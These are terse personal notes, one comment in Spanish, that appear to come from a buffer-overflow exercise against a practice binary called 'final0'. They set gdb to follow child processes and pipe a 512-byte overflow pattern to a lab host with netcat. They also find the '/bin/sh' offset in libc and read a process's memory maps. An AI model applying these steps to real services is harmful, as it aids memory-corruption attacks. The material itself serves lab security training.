set follow-fork-mode child
python -c "print 'A'*512+'bbbbccccddddeeeeffffgggghhhhhiiii'" | nc 192.168.0.10 2995
buscar un texto en libc:   grep -P -a -b -o /bin/sh /libc.so.6
grep -R -a -b -o /bin/sh /lib/libc.so.6
pidof final0
cat /proc/1697/maps

